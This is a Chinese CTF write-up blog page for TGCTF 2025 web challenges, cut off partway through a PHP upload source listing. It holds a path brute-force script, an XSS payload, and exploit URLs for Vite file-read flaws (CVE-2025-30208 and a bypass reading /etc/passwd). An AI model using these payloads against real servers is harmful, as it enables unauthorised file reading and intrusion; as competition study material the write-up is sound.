<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="允许一切如其所是">
    <meta name="author" content="C3ngH">
    
    <title>
        
            2025 TGCTF WriteUp By A1natas - AAAflag批发商 |
        
        C3ngH&#39;s B10g
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"c3ngh.top","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"C3ngH's B10g","author":"C3ngH","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","logo":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","favicon":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"},"menu":{"home":"/","archives":"/archives","links":"/links","设备":"/devices","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"CTF Misc / A1natas Team / V＆N Team / More","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/zch050217","weixin":null,"qq":"./images/qqQRcode.jpg","weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":"https://blog-waline-weld.vercel.app/","reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"links":[{"title":"A1natas's Teammates"},{"name":"Lunatic - Misc指路人@星盟安全团队","link":"https://goodlunatic.github.io/","description":"Mind and Hand :)","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Lunatic.png"},{"name":"A1ic3 - Crypto@V&N","link":"https://a1ic3.cn/","description":"希望成为一个有趣的人","avatar":"https://www.a1ic3.cn/avatar.png"},{"name":"PangBai - Reverse@W&M","link":"https://pangbai.work/","description":"世上所有不利都是当事人无能所致","avatar":"http://pangbai.work/images/avatar.jpg"},{"name":"void2eye - Web@WpgSec狼组安全","link":"https://void2eye.fun/","description":"临渊羡鱼，不如退而结网。","avatar":"https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/808.png"},{"name":"carbofish - 全栈@r3kapig","link":"https://carbo.ink/","description":"lfy,wcnm!","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/CarboFish.jpg"},{"name":"AsaL1n - Web@V&N","link":"https://asal1n.github.io/","description":"why we need that?","avatar":"https://asal1n.github.io/img/head.jpg"},{"name":"enllus1on - Pwn@Nu1L","link":"https://enllus1on.github.io/","description":"pwn for more","avatar":"https://enllus1on.github.io/images/kano.jpg"},{"name":"Straw - Reverse","link":"https://straw-233.github.io/","description":"午门痴","avatar":"https://straw-233.github.io/avatar/meinasi.png"},{"name":"CHHHCHHOH - Web","link":"https://chhhchhoh.cn/","description":"吃了乙酸的乙醇会不会梦到乙酸乙酯？","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/zyc.png"},{"name":"WoodWhale - 全栈@r3kapig","link":"https://woodwhale.cn/","description":"A happy woodwhale!","avatar":"https://www.woodwhale.cn/woodwhale.png"},{"name":"XunFlash - Reverse","link":"https://www.xunflash.top/","description":"你好","avatar":"https://www.xunflash.top/icon.png"},{"name":"huanghunr - Reverse@Nu1L Junior","link":"https://blog.huanghunr.top","description":"喵喵喵?!还没想好","avatar":"https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg"},{"name":"温婳霂 - Misc@V&N","link":"https://somokel.github.io","description":"春祺夏安，秋绥冬宁。","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/wenhuamu.jpg"},{"name":"MetaVi - Misc@N0wayBack","link":"https://metaviii.github.io","description":"Add a touch of fantasy?","avatar":"https://s2.loli.net/2024/12/04/jJpynvQUCA3RlIG.jpg"},{"title":"V&N's Teammates"},{"name":"Aecous","link":"https://aecous.github.io/","description":"web✌","avatar":"https://aecous.github.io/images/me.png"},{"name":"yixinBC","link":"https://blog.buyix.in/","avatar":"https://c.img.dasctf.com/LightPicture/2024/08/c6a64c00f2c066f8.jpg","description":"超级菜浑水摸鱼手"},{"title":"Other CTFer"},{"name":"sheep","link":"https://s1nec-1o.github.io/","description":"努力学习的pwner(ROIS✌","avatar":"https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"},{"name":"LilRan","link":"https://blog.xinshi.fun/","description":"今日启程 无畏向前","avatar":"https://blog.xinshi.fun/assets/avatar.png"},{"name":"_sun_","link":"https://sun1028.top/","description":"我也不知道要啥描述","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/sun.jpg"},{"name":"G3rling","avatar":"https://g3rling.top/wp-content/uploads/2024/03/头像.jpg","description":"少说话，多做事","link":"https://g3rling.top/"},{"name":"Mia","avatar":"https://miablog.oss-cn-nanjing.aliyuncs.com/img/Mia.png","link":"https://blog.miamia.top","description":"无论如何，感谢经历。"},{"name":"清酒","avatar":"http://clearwine.online/images/qingjiu.jpg","link":"http://clearwine.online/","description":"旅途还在继续，谁也不知道他会在什么时候到达终点。"},{"name":"lianjin","avatar":"https://lianjinlll.cn/images/profilePicture.jpg","link":"https://lianjinlll.cn","description":"hell0_w0r1d"},{"name":"n0o0b","link":"https://www.n0o0b.com","avator":"https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/n0o0b.png","description":"To be a better noob"},{"title":"战队"},{"name":"A1natas","link":"https://www.a1natas.com/","description":"ZJNU A1natas Group","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/A1natas.png"},{"name":"V&N","link":"https://vnteam.cn/","description":"V&N Union CTF Team","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VN.png"}]},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                </a>
            
            <a class="site-name border-box" href="/">
               C3ngH&#39;s B10g
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                首页
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                归档
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/links">
                                
                                友链
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/devices">
                                
                                设备
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/about">
                                
                                关于
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            首页
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            归档
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
                            
                            友链
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/devices">
                            
                            设备
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
                            
                            关于
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        2025 TGCTF WriteUp By A1natas - AAAflag批发商
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">C3ngH</span>
                                
                                    <span class="author-badge">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-04-14 21:36:55</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Mon Apr 14 2025 21:42:47 GMT+0800">2025-04-14 21:42:47</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/WriteUp/">WriteUp</a></li>
                        
                    
                </ul>
            </span>
        

        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>9.7k 字</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>56 分钟</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p>由于A1natas官网和A1CTF正在重构，本博客将用于暂存A1natas的WriteUp</p>
<h2 id="Web：">Web：</h2>
<h3 id="AAA偷渡阴平">AAA偷渡阴平</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/3e7d77e8-45fa-4e28-b1b0-281e69b2a2ca.png"
                        alt=""
                 ></p>
<h3 id="火眼">火眼</h3>
<p>tgshell 直接连接马就行</p>
<h3 id="直面天命">直面天命</h3>
<p>先爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用所有26个小写字母</span></span><br><span class="line">all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义测试单个路径的函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):</span><br><span class="line">    url = BASE_URL + path</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span></span><br><span class="line">        status = response.status_code</span><br><span class="line">        length = <span class="built_in">len</span>(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录所有非404响应</span></span><br><span class="line">        <span class="keyword">if</span> status != <span class="number">404</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 保存发现的路径到文件中</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span></span><br><span class="line">            <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示开始信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跟踪进度变量</span></span><br><span class="line">total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span></span><br><span class="line">completed = <span class="number">0</span></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程加速过程</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    <span class="comment"># 生成并测试所有4字母组合</span></span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):</span><br><span class="line">        path = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">        executor.submit(test_path, path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 定期更新进度</span></span><br><span class="line">        completed += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:</span><br><span class="line">            elapsed = time.time() - start_time</span><br><span class="line">            percentage = (completed / total_combinations) * <span class="number">100</span></span><br><span class="line">            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            remaining = (total_combinations - completed) / \</span><br><span class="line">                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span></span><br><span class="line">                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>路由是/aazz</p>
<p>访问提示可以传参，FUZZ一下，filename任意读，proc/1/environ出了</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fae15437-d8cb-47d6-b560-fef9a65e75bf.png"
                        alt=""
                 ></p>
<h3 id="GAME">GAME</h3>
<p>通过调试拿到score：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/6dfa6948-9850-4743-b09d-041193ef7837.png"
                        alt=""
                 > <img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/attachments/84abad31-e954-481a-b2d2-88cdae48758a.png"
                        alt="" title=" =1002x"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c2273582-8380-47c8-9704-b777bd8a477d.png"
                        alt=""
                 ></p>
<p>目前到这里</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const container = document.querySelector(<span class="string">&#x27;.container&#x27;</span>)</span><br><span class="line">onst stage = document.querySelector(<span class="string">&#x27;.container&#x27;</span>).__vnode.ctx.devtoolsRawSetupState.games</span><br><span class="line">console.log(stage.score)</span><br><span class="line">stage.score = `&lt;img src=x onerror=<span class="string">&#x27;alert(114514)&#x27;</span>&gt;`;</span><br></pre></td></tr></table></figure>
<p><strong>CVE-2025-30208</strong></p>
<p>直接打就完了，<a class="link"   target="_blank" rel="noopener" href="http://node2.tgctf.woooo.tech:30852/@fs//tgflagggg?import&amp;raw??" >http://node2.tgctf.woooo.tech:30852/@fs//tgflagggg?import&amp;raw??<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/f84fb547-19c4-4409-8b47-b237527ed072.png"
                        alt=""
                 ></p>
<h3 id="GAME-plus">GAME plus</h3>
<p>30208被修复了，主要修改了transform.ts。</p>
<p>但是可以打/@fs/etc/passwd?import&amp;?inline=1.wasm?init</p>
<p>inline不行就换成svg</p>
<p>（来自知识星球的一篇文章）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4adf82be-f543-4cf5-abf2-046f5d52fc92.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/99d486d3-e563-4793-b21c-39005e7c7152.png"
                        alt="" title=" =300x336"
                 ></p>
<h3 id="GAME-Ultra"><strong>GAME Ultra</strong></h3>
<p>附件为<code>&quot;vite&quot;: &quot;6.2.5&quot;,</code></p>
<p>直接打CVE-2025-32395</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1.png"
                        alt="1"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://somokel.oss-cn-hangzhou.aliyuncs.com/img/2.png"
                        alt="2"
                 ></p>
<h3 id="ezupload">ezupload</h3>
<p>fuzz了一下，nginx＋php7，黑名单。</p>
<p>.bak找到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&#x27;UPLOAD_PATH&#x27;</span>, __DIR__ . <span class="string">&#x27;/uploads/&#x27;</span>);</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">$status_code = <span class="number">200</span>; // 默认状态码为 <span class="number">200</span></span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            $file_name = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $file_name = basename($_FILES[<span class="string">&#x27;name&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;name&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $file_content = file_get_contents($temp_file);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/.+?&lt;/s&#x27;</span>, $file_content)) &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;</span><br><span class="line">                $status_code = <span class="number">403</span>; // <span class="number">403</span> 表示禁止访问</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $img_path = UPLOAD_PATH . $file_name;</span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                    $is_upload = true;</span><br><span class="line">                    $msg = <span class="string">&#x27;文件上传成功！&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">                    $status_code = <span class="number">500</span>; // <span class="number">500</span> 表示服务器内部错误</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">            $status_code = <span class="number">403</span>; // <span class="number">403</span> 表示禁止访问</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">        $status_code = <span class="number">404</span>; // <span class="number">404</span> 表示资源未找到</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 设置 HTTP 状态码</span><br><span class="line">http_response_code($status_code);</span><br><span class="line"></span><br><span class="line">// 输出结果</span><br><span class="line">echo json_encode([</span><br><span class="line">    <span 